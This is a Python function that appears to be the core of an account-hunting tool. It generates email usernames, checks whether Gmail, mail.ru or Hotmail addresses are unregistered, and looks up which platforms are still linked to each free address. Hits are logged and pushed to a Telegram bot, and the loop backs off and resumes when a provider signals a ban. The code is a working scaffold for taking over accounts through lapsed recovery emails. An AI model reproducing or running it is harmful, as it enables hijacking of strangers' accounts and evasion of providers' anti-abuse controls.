def hunter_engine_core(prefix, total_len, token, chat_id, selected_platforms, domains):
    global hits, bad, stop_thread, ban_detected
    
    while not stop_thread:
        if ban_detected:
            time.sleep(15)
            ban_detected = False
            continue
            
        try:
            user = generate_user_with_prefix(prefix, total_len)
            
            for domain in domains:
                email = f"{user}@{domain}"
                
                if 'gmail' in domain:
                    status = MailAvailability.check_gmail(email)
                elif 'mail.ru' in domain or 'bk.ru' in domain:
                    status = MailAvailability.check_mail_ru(email)
                else:
                    status = MailAvailability.check_hotmail(email)

                if status == "BAN":
                    ban_detected = True
                    break
                
                if status == True:
                    linked = discovery_engine(email, selected_platforms)
                    
                    if linked:
                        hits += 1
                        clean_linked = [re.sub(r'\033\[[0-9;]*m', '', p) for p in linked]
                        platform_names = " + ".join(clean_linked)
                        
                        hit_entry = f"{email} | Platforms: {platform_names}"
                        save_hit_locally(hit_entry)
                        
                        if token and chat_id:
                            send_telegram(token, chat_id, email, platform_names)
                        
                        print(f"\n{F} [HIT] {email} ➜ {platform_names}")
                    else:
                        bad += 1
                        print(f"{G} [AVAILABLE] {email} (No Platform)", end="\r")
                else:
                    bad += 1
                    print(f"{G} [TAKEN] {email}", end="\r")
                
                time.sleep(random.uniform(0.01, 0.04))
                
        except Exception as e:
            pass

